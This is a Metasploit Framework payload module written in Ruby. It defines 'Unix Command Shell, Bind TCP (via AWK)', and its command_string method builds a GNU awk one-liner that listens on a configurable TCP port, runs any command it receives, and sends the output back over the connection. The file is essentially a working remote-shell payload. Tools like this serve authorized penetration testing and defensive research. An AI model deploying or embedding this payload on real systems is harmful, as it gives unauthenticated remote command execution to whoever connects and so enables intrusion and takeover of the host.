##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 140

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Bind TCP (via AWK)',
      'Description'   => 'Listen for a connection and spawn a command shell via GNU AWK',
      'Author'        =>
        [
          'espreto <robertoespreto[at]gmail.com>',
          'Ulisses Castro <uss.thebug[at]gmail.com>'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'gawk',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    awkcmd = <<~AWK
      awk 'BEGIN{
        s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";
        do{
          if((s|&getline c)<=0)
            break;
          if(c){
            while((c|&getline)>0)print $0|&s;
            close(c)
          }
        } while(c!=\"exit\")
        close(s)
      }'
    AWK
    awkcmd.gsub!("\n",'').gsub!('  ', '')
  end

end
